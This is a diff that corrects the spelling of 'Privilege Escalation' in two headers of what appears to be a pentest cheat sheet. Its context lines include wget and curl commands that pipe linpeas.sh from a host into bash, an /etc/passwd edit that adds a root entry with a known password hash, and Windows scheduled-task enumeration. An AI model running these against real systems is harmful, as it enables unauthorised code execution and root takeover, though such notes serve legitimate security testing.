@@ -431,7 +431,7 @@ wget -qO- 192.168.214.128/linux/linpeas.sh | bash
 curl 192.168.214.128/linux/linpeas.sh | bash
 
 ## Linux
-[*] Priviledge Escalation
+[*] Privilege Escalation
 nano /etc/passwd
 mkpasswd -m descrypt 'password'
 root:Vg4sD8/6ZPqpk:0:0:root:/root:/usr/bin/bash
@@ -466,7 +466,7 @@ stty rows <num> columns <num>
 reset
 
 ## Windows
-[*] Priviledge Escalation
+[*] Privilege Escalation
 Get-ScheduledTask | Where-Object {($_.Author -notmatch "Microsoft")} | Select-Object TaskName, TaskPath, State, Author
 services.msc
 
